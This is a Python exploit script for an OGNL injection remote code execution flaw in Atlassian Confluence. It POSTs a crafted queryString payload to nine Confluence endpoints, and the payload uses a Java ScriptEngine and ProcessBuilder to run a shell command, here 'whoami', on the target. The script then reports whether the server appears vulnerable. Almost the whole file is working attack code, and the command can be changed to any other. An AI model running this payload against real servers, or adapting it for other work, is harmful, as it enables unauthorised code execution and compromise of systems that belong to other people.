import re
import requests
import sys
import os
import base64

def exploit(dst_addr):
	li = ["/pages/createpage-entervariables.action?SpaceKey=x",
		"/wiki/pages/createpage-entervariables.action?SpaceKey=x",
		"/pages/doenterpagevariables.action",
		"/pages/createpage.action?spaceKey=myproj",
		"/users/user-dark-features",
		"/pages/templates2/viewpagetemplate.action",
		"/template/custom/content-editor",
		"/templates/editor-preload-container",
		"/pages/createpage-entervariables.action"
	]
	print(dst_addr)
	for i in li :
		URL="http://"+dst_addr+i
		print(URL)
		cmd = 'whoami'
		data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
		header = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
		}
		res = requests.post(URL, data=data, headers = header, verify=False)
		
			
		response = res.text

		p = re.compile('queryString(\'|\") value.*')
		m = p.match(response)
		print("Status Code : %d"% res.status_code)
		if m:
				print("vuln detected! <Command : whoami>")
				print(m)
		else:
				print("Vuln Not Found")


if __name__ == "__main__":
	if len(sys.argv) == 2:
		   sys.argv.append('80')
	elif len(sys.argv) < 3:
			print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
			sys.exit()	
	address =(sys.argv[1], sys.argv[2])
	dst_addr=":".join(address)
	exploit(dst_addr)
